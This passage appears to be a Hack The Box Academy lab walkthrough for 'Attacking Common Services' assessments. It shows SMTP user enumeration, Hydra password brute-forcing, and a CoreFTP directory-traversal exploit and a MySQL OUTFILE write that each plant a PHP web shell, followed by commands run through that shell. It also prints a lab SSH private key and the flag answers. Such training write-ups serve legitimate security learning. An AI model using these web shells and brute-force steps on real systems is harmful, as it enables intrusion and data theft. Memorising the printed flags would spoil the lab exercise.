|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, ConnectWithDatabase, FoundRows, LongColumnFlag, Speaks41ProtocolNew, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: s`gc>J7s`gdB\'M.>,`#
|_  Auth Plugin Name: mysql_native_password
<SNIP>
```

With SMTP open, students need to enumerate users with `smtp-user-enum`, however first, [users.zip](https://academy.hackthebox.com/storage/resources/users.zip) must be downloaded and unzipped:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip

--2022-11-27 14:08:13--  https://academy.hackthebox.com/storage/resources/users.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 434 [application/zip]
Saving to: ‘users.zip’

users.zip                                   100%[===========================================================================================>]     434  --.-KB/s    in 0s      

2022-11-27 14:08:13 (1.48 MB/s) - ‘users.zip’ saved [434/434]

Archive:  users.zip
  inflating: users.list
```

Subsequently, students need to use `smtp-user-enum`, setting the method to use for username guessing to be `RCPT`, the file of usernames to be checked to be `users.list`, and the domain to be `inlanefreight.htb`, finding the username `fiona`:

Code: shell

```shell
/usr/bin/smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ /usr/bin/smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sun Nov 27 14:11:34 2022 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Sun Nov 27 14:11:36 2022 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)
```

Then, students need to bruteforce the FTP password of the user `fiona` using either `Hydra` or `medusa`; `Hydra` will be used, most importantly, the number of threads is set to 1, otherwise students will get a 550 error:

Code: shell

```shell
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://STMIP -u -t 1
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://10.129.3.107 -u -t 1

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 15:06:58
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking ftp://10.129.3.107:21/
[STATUS] 74.00 tries/min, 74 tries in 00:01h, 14344325 to do in 3230:43h, 1 active
[21][ftp] host: 10.129.3.107   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

With the found credentials `fiona:987654321`, students need to connect to the FTP server on the spawned target, providing `fiona` as the username and `987654321` as the password

Code: shell

```shell
ftp STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ ftp 10.129.203.7

Connected to 10.129.203.7.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.203.7:root): fiona
331 password required for fiona
Password:
230-Logged on
230 
Remote system type is UNIX.
Using binary mode to transfer files.
```

When using `dir` to list the files available, students will find `docs.txt` and `WebServersInfo.txt`, thus, they need to `get` them:

Code: shell

```shell
get docs.txt
get WebServersInfo.txt
bye
```

```shell-session
ftp> get docs.txt

local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
55 bytes received in 0.00 secs (135.2920 kB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
226 Transfer Complete
255 bytes received in 0.00 secs (747.8181 kB/s)
```

When checking out the contents of `WebServersInfo.txt`, students will notice that the spawned target uses `CoreFTP`, and that the `Apache` directory is at `C:\xampp\htdocs\`:

Code: shell

```shell
awk 1 WebServersInfo.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ awk 1 WebServersInfo.txt

CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Armed with this info, students need to search for `CoreFTP` exploits using `searchsploit`:

Code: shell

```shell
searchsploit CoreFTP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ searchsploit CoreFTP

---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CoreFTP 2.0 Build 674 MDTM - Directory Traversal (Metasploit)                                                                                 | windows/remote/48195.txt
CoreFTP 2.0 Build 674 SIZE - Directory Traversal (Metasploit)                                                                                 | windows/remote/48194.txt
CoreFTP 2.1 b1637 - Password field Universal Buffer Overflow                                                                                  | windows/local/11314.py
CoreFTP Server build 725 - Directory Traversal (Authenticated)                                                                                | windows/remote/50652.txt
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Since students have the credentials `fiona:987654321`, they need to mirror/copy the `windows/remote/50652.txt` exploit:

Code: shell

```shell
searchsploit -x windows/remote/50652.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ searchsploit -m windows/remote/50652.txt

  Exploit: CoreFTP Server build 725 - Directory Traversal (Authenticated)
      URL: https://www.exploit-db.com/exploits/50652
     Path: /usr/share/exploitdb/exploits/windows/remote/50652.txt
File Type: ASCII text

Copied to: /home/htb-ac413848/50652.txt
```

After reading the text file, students will know that they can create files with `PUT` requests:

Code: shell

```shell
cat 50652.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ cat 50652.txt 

# Exploit Title: CoreFTP Server build 725 - Directory Traversal (Authenticated)
# Date: 08/01/2022
# Exploit Author: LiamInfosec
# Vendor Homepage: http://coreftp.com/
# Version: build 725 and below
# Tested on: Windows 10
# CVE : CVE-2022-22836

# Description:

CoreFTP Server before 727 allows directory traversal (for file creation) by an authenticated attacker via ../ in an HTTP PUT request.

# Proof of Concept:

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

Therefore, students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssl rand -hex 16`) within the `--data-binary` option, utilizing the `Apache` directory `/xampp/htdocs` (since other directories might not be allowed):

Code: shell

```shell
curl -k -X PUT -H "Host: STMIP" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://STMIP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -k -X PUT -H "Host: 10.129.242.84" --basic -u fiona:987654321 --data-binary '<?php echo shell_exec($_GET["c"]);?>' --path-as-is https://10.129.242.84/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php

HTTP/1.1 200 Ok
Date:Sun, 27 Oct 2022 16:10:37 GMT
Server: Core FTP HTTP Server
Accept-Ranges: bytes
Connection: Keep-Alive
Content-type: application/octet-stream
Content-length: 36
```

At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -w "\n" http://10.129.242.84/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

The second method to solve this question differs in that the web shell is not written using the `CoreFTP` exploit but rather via `MySQL`. With the attained `fiona:987654321` credentials, students need to connect to `MySQL` server on the spawned target:

Code: shell

```shell
mysql -u fiona -p987654321 -h STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ mysql -u fiona -p987654321 -h 10.129.242.84

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

Subsequently, to check whether files can be read and written, students need to query for the value of the global variable `secure_file_priv`, finding it to be empty, therefore, files can be read and written:

Code: shell

```shell
show variables like "secure_file_priv";
```

```shell-session
MariaDB [(none)]> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.016 sec)
```

Students need to write a PHP file that contains a web shell (students can generate a random name with the command `openssh rand -hex 16`) with the statement `SELECT ... INTO OUTFILE`, utilizing the `Apache` directory `/xampp/htdocs`:

Code: sql

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';
```

```shell-session
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';

Query OK, 1 row affected (0.015 sec)
```

Then, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`, using the web shell (utilizing HTTP and not HTTPS):

Code: shell

```shell
curl -w "\n" http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ curl -w "\n" http://10.129.242.84/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt

HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

Answer: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

# Attacking Common Services - Medium

## Question 1

### "Assess the target server and find the the flag\.txt file\. Submit the contents of this file as your answer."

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ nmap -A 10.129.183.208

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:47 GMT
Nmap scan report for 10.129.183.208
Host is up (0.013s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
<SNIP>
53/tcp   open  domain   ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
<SNIP>
```

Students will notice that there is a DNS server running, therefore, they need to attempt a zone transfer with `dig`:

Code: shell

```shell
dig AXFR inlanefreight.htb @STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ dig AXFR inlanefreight.htb @10.129.183.208

; <<>> DiG 9.16.27-Debian <<>> AXFR inlanefreight.htb @10.129.183.208
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.200.5
dc1.inlanefreight.htb.	604800	IN	A	10.129.100.10
dc2.inlanefreight.htb.	604800	IN	A	10.129.200.10
int-ftp.inlanefreight.htb. 604800 IN	A	127.0.0.1
int-nfs.inlanefreight.htb. 604800 IN	A	10.129.200.70
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
un.inlanefreight.htb.	604800	IN	A	10.129.200.142
ws1.inlanefreight.htb.	604800	IN	A	10.129.200.101
ws2.inlanefreight.htb.	604800	IN	A	10.129.200.102
wsus.inlanefreight.htb.	604800	IN	A	10.129.200.80
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 13 msec
;; SERVER: 10.129.183.208#53(10.129.183.208)
;; WHEN: Sun Nov 27 16:59:44 GMT 2022
;; XFR size: 13 records (messages 1, bytes 372)
```

Subsequently, students need to add the vHost `int-ftp.inlanefreight.htb` (this can be easily known as the section says "From internal conversations, we heard that this is used relatively rarely and, in most cases, has only been used for testing purposes so far.") into `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP int-ftp.inlanefreight.htb" >> /etc/hosts'
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-8ggdvgqazc]─[~]
└──╼ [★]$ sudo sh -c 'echo "10.129.183.208 int-ftp.inlanefreight.htb" >> /etc/hosts'
```

Launching an `Nmap` scan agains `int-ftp.inlanefreight.htb`, students will find that port 30021 runs `ProFTPD`:

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nmap -p- -T4 -A int-ftp.inlanefreight.htb

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 17:16 GMT
Nmap scan report for int-ftp.inlanefreight.htb (10.129.183.208)
Host is up (0.014s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
<SNIP>
30021/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Internal FTP) [10.129.183.208]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
```

When attempting to use anonymous FTP login (i.e., `anonymous` for username and anything for password) on port 30021, students will notice that they can login successfully:

Code: shell

```shell
ftp int-ftp.inlanefreight.htb 30021
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ ftp int-ftp.inlanefreight.htb 30021

Connected to int-ftp.inlanefreight.htb.
220 ProFTPD Server (Internal FTP) [10.129.183.208]
Name (int-ftp.inlanefreight.htb:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
```

Listing directories and files with `ls`, students will notice that there is a directory by the name `simon`:

Code: shell

```shell
ls
```

```shell-session
ftp> ls

200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
```

After moving directories into `simon`, students need to `get` the file "mynotes.txt":

Code: shell

```shell
cd simon
get mynotes.txt
bye
```

```shell-session
ftp> cd simon

250 CWD command successful
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
200 PORT command successful
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
226 Transfer complete
153 bytes received in 0.00 secs (53.1723 kB/s)
ftp> bye
221 Goodbye.
```

Checking the contents of the file "mynotes.txt", students will notice that it contains a possible wordlist of passwords, thus, they need to use it to bruteforce the password for the user `simon` on the `POP3` service, finding the credentials `simon:8Ns8j1b!23hs4921smHzwn`:

Code: shell

```shell
hydra -l simon -P mynotes.txt pop3://STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ hydra -l simon -P mynotes.txt pop3://10.129.183.208

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-27 17:32:00
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.183.208:110/
[110][pop3] host: 10.129.183.208   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-27 17:32:05
```

With the attained credentials, students need to connect to port 110 and use `simon` for user and `8Ns8j1b!23hs4921smHzwn` for password to log in:

Code: shell

```shell
nc -nv STMIP 110
user simon
pass 8Ns8j1b!23hs4921smHzwn
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nc -nv 10.129.183.208 110

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.183.208:110.
+OK Dovecot (Ubuntu) ready.
user simon
+OK
pass 8Ns8j1b!23hs4921smHzwn
+OK Logged in.
```

When using the `list` command, students will find that there is only one email, thus, they need to use `retr` on its index:

Code: shell

```shell
list
retr 1
quit
```

```shell-session
list

+OK 1 messages:
1 1630
.
retr 1
+OK 1630 octets
From admin@inlanefreight.htb  Mon Apr 18 19:36:10 2022
Return-Path: <root@inlanefreight.htb>
X-Original-To: simon@inlanefreight.htb
Delivered-To: simon@inlanefreight.htb
Received: by inlanefreight.htb (Postfix, from userid 0)
	id 9953E832A8; Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
Subject: New Access
To: <simon@inlanefreight.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20220418193610.9953E832A8@inlanefreight.htb>
Date: Mon, 18 Apr 2022 19:36:10 +0000 (UTC)
From: Admin <root@inlanefreight.htb>

Hi,
Here is your new key Simon. Enjoy and have a nice day..

-----BEGIN OPENSSH PRIVATE KEY----- 
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg 
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== 
-----END OPENSSH PRIVATE KEY-----
```

Students need to save the SSH private key into a file, after removing the newline characters with `sed` (students also need to fix the header and footer so that they are only on one line, alternatively, students can paste in the key without the header and footer into [samltool](https://www.samltool.com/format_privatekey.php) to get it formatted properly):

Code: shell

```shell
echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ echo '-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4 4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W 1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5 xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi 6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ== -----END OPENSSH PRIVATE KEY-----' | sed 's/ /\n/g' > id_rsa
```

The final SSH private key is:

```shell-session
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S4
4W1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKm
w5xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAIITrtUA067VAMAAAAH
c3NoLXJzYQAAAIEN11i6S5a2WTtRlu2BG8nQ7RKBtK0AgOlREm+mfdZWpPn0HEvl92S44W
1H2nKwAWwZIBlUmw4iUqoGjib5KvN7H4xapGWIc5FPb/FVI64DjMdcUNlv5GZ38M1yKmw5
xKGD/5xEWZt6tofpgYLUNxK62zh09IfbEOORkc5J9z2jUpEAAAADAQABAAAAgQe3Qpknxi
6E89J55pCQoyK65hQ0WjTrqCUvt9oCUFggw85Xb+AU16tQz5C8sC55vH8NK9HEVk6/8lSR
Lhy82tqGBfgGfvrx5pwPH9a5TFhxnEX/GHIvXhR0dBlbhUkQrTqOIc1XUdR+KjR1j8E0yi
ZA4qKw1pK6BQLkHaCd3csBoQAAAEECeVZIC1Pq6T8/PnIHj0LpRcR8dEN0681+OfWtcJbJ
hAWVrZ1wrgEg4i75wTgud5zOTV07FkcVXVBXSaWSPbmR7AAAAEED81FX7PttXnG6nSCqjz
B85dsxntGw7C232hwgWVPM7DxCJQm21pxAwSLxp9CU9wnTwrYkVpEyLYYHkMknBMK0/QAA
AEEDgPIA7TI4F8bPjOwNlLNulbQcT5amDp51fRWapCq45M7ptN4pTGrB97IBKPTi5qdodg
O9Tm1rkjQ60Ty8OIjyJQAAABBzaW1vbkBsaW4tbWVkaXVtAQ==
-----END OPENSSH PRIVATE KEY-----
```

Before utilizing the private key, students first need to change its permissions so that it is 600:

Code: shell

```shell
chmod 600 id_rsa
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

At last, students need to use the private key to connect to the SSH service on the spawned target, using the username `simon`, and then printing out the flag file "flag.txt":

Code: shell

```shell
ssh -i id_rsa simon@10.129.229.46
cat flag.txt
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ ssh -i id_rsa simon@10.129.229.46

The authenticity of host '10.129.229.46 (10.129.229.46)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.46' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
<SNIP>
simon@lin-medium:~$ cat flag.txt

HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

Answer: `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

# Attacking Common Services - Hard

## Question 1

### "What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)"

After spawning the target machine, students need to launch an `Nmap` scan against it:

Code: shell

```shell
nmap -A -Pn STMIP
```

```shell-session
┌─[eu-academy-1]─[10.10.14.45]─[htb-ac413848@htb-rureq65obq]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.112.104

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 19:19 GMT
Nmap scan report for 10.129.112.104
Host is up (0.013s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-11-27T19:16:10
|_Not valid after:  2052-11-27T19:16:10
